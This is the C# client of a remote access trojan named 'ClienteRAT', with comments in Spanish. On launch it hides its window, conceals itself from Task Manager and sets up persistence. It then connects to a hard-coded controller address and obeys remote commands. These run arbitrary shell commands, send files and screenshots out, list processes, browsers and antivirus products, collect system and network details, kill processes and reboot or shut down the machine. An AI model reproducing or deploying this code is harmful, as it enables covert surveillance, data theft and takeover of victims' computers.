using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using Client.Native;
using Client.Commands;
using Client.Util;
using System.IO;


namespace Client
{
    class ClienteRAT
    {
        private static TcpClient client;
        private static NetworkStream stream;
        private static bool connected = true;

        static void Main(string[] args)
        {
            try
            {
                // Ocultar la consola al inicio
                IntPtr hwnd = Process.GetCurrentProcess().MainWindowHandle;
                if (hwnd != IntPtr.Zero)
                {
                    NativeMethods.ShowWindow(hwnd, NativeMethods.SW_HIDE);
                }

                // Ocultar el proceso del Administrador de Tareas y generar persistencia
                Functions.HideFromTaskManager();
                Functions.AddPersistence();

                // Iniciar la conexión con el servidor
                client = new TcpClient("192.168.1.132", 443);
                stream = client.GetStream();

                // Bucle principal para recibir comandos y enviar respuestas
                while (connected)
                {
                    try
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                        string response;
                        if (command.StartsWith("exec"))
                        {
                            response = HandleCommands.ExecuteCommand(command.Substring(5));
                        }
                        else if (command == "list_processes")
                        {
                            response = Functions.ListProcesses();
                        }
                        else if (command.StartsWith("get "))
                        {
                            string fileName = command.Substring(4).Trim();
                            response = "";
                            SendFile(fileName);
                        }
                        else if (command == "browsers")
                        {
                            response = Functions.ListInstalledBrowsers();
                        }
                        else if (command == "reboot")
                        {
                            response = HandleCommands.ExecuteCommand("shutdown /r /t 10");
                        }
                        else if (command == "shutdown")
                        {
                            response = HandleCommands.ExecuteCommand("shutdown /s");
                        }
                        else if (command == "antivirus")
                        {
                            response = Functions.ListInstalledAntivirus();
                        }
                        else if (command == "network_info")
                        {
                            response = Functions.GetNetworkInfo();
                        }
                        else if (command == "system_info")
                        {
                            response = Functions.GetSystemInfo();
                        }
                        else if (command=="screenshot")
                        {
                            string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                            string filename = $"infiltrator-{timestamp}-screenshot.png";
                            Screenshot.CaptureScreen(filename);
                            SendFile(filename);
                            File.Delete(filename);
                            response = "";
                        }
                        else if (command == "disconnect")
                        {
                            response = "";
                            connected = false;
                        }
                        else if (command.StartsWith("kill "))
                        {
                            int pid;
                            if (int.TryParse(command.Substring(5), out pid))
                            {
                                response = Functions.KillProcess(pid);
                            }
                            else
                            {
                                response = "Formato de comando 'kill' incorrecto. Uso: kill PID";
                            }
                        }
                        else
                        {
                            response = "Comando no reconocido.";
                        }

                        SendResponse(response);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error: {ex.Message}");
                        connected = false;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error en la conexión: {ex.Message}");
            }
            finally
            {
                client.Close();
            }
        }
        

        static void SendFile(string fileName)
        {
            try
            {
                byte[] fileNameBytes = Encoding.UTF8.GetBytes($"FILE: {fileName}\n");
                stream.Write(fileNameBytes, 0, fileNameBytes.Length);

                byte[] fileData = File.ReadAllBytes(fileName);
                
                stream.Write(fileData, 0, fileData.Length);

                byte[] fileEndBytes = Encoding.UTF8.GetBytes("FILE_END\n");
                
                stream.Write(fileEndBytes, 0, fileEndBytes.Length);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error al enviar el archivo: {ex.Message}");
            }
        }

   

        static void SendResponse(string response)
        {

            byte[] data = Encoding.UTF8.GetBytes(response);
            stream.Write(data, 0, data.Length);
        }

        


       
    }
}
